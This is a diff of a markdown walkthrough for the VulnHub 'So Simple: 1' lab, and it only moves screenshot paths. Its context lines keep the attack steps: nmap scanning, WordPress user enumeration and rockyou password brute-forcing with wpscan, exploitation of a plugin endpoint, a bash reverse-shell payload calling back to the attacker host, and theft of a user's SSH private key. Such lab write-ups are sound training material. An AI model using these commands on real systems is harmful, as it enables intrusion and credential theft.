@@ -3,7 +3,7 @@
 - **Machine:** So Simple: 1
 - **Download:** https://www.vulnhub.com/entry/so-simple-1,515/
 
-![](795-1.png)
+![](images/795-1.png)
 
 ---
 
@@ -15,7 +15,7 @@
 7z e So-Simple-1.7z
 ```
 
-![](795-2.png)
+![](images/795-2.png)
 
 2. Import the **OVA** file into VirtualBox.
 3. Click **Finish**.
@@ -33,7 +33,7 @@ Identify the IP address assigned to the target.
 nmap -sn 192.168.2.0/24
 ```
 
-![](795-3.png)
+![](images/795-3.png)
 
 ---
 
@@ -45,7 +45,7 @@ Perform a complete scan to identify open ports, services, operating system infor
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.108
 ```
 
-![](795-4.png)
+![](images/795-4.png)
 
 ---
 
@@ -73,7 +73,7 @@ Run the HTTP enumeration NSE script.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.108
 ```
 
-![](795-5.png)
+![](images/795-5.png)
 
 ---
 
@@ -103,7 +103,7 @@ Enumerate WordPress usernames.
 wpscan --url http://192.168.2.108/wordpress -e u
 ```
 
-![](795-6.png)
+![](images/795-6.png)
 
 If enumeration fails, update **WPScan** to the latest version and repeat the scan.
 
@@ -117,7 +117,7 @@ Attempt to recover valid WordPress credentials.
 wpscan --url http://192.168.2.108/wordpress -U admin,max -P /opt/rockyou.txt -t 50
 ```
 
-![](795-7.png)
+![](images/795-7.png)
 
 Recovered credentials:
 
@@ -136,7 +136,7 @@ Authenticate to the administrator panel.
 http://192.168.2.108/wordpress/wp-login.php
 ```
 
-![](795-8.png)
+![](images/795-8.png)
 
 ---
 
@@ -152,7 +152,7 @@ https://www.exploit-db.com/exploits/46794
 
 Download the exploit.
 
-![](795-9.png)
+![](images/795-9.png)
 
 Review the exploit source.
 
@@ -160,7 +160,7 @@ Review the exploit source.
 cat 46794.py
 ```
 
-![](795-10.png)
+![](images/795-10.png)
 
 The exploit targets the following vulnerable endpoint:
 
@@ -168,7 +168,7 @@ The exploit targets the following vulnerable endpoint:
 http://192.168.2.108/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s
 ```
 
-![](795-11.png)
+![](images/795-11.png)
 
 ---
 
@@ -186,7 +186,7 @@ Insert the payload.
 <pre>system("bash -c 'bash -i >& /dev/tcp/192.168.2.219/443 0>&1'")</pre>
 ```
 
-![](795-12.png)
+![](images/795-12.png)
 
 ---
 
@@ -218,7 +218,7 @@ http://192.168.2.108/wordpress/wp-admin/admin-post.php?swp_debug=load_options&sw
 
 A reverse shell is received.
 
-![](795-13.png)
+![](images/795-13.png)
 
 ---
 
@@ -238,7 +238,7 @@ cd max
 cd .ssh
 ```
 
-![](795-14.png)
+![](images/795-14.png)
 
 Display the private key.
 
@@ -246,7 +246,7 @@ Display the private key.
 cat id_rsa
 ```
 
-![](795-15.png)
+![](images/795-15.png)
 
 ---
 
@@ -260,7 +260,7 @@ nano id_rsa
 
 Paste the recovered private key.
 
-![](795-16.png)
+![](images/795-16.png)
 
 Assign the correct permissions.
 
@@ -278,7 +278,7 @@ Authenticate using the recovered SSH private key.
 ssh -i id_rsa max@192.168.2.108
 ```
 
-![](795-17.png)
+![](images/795-17.png)
 
 ---
 
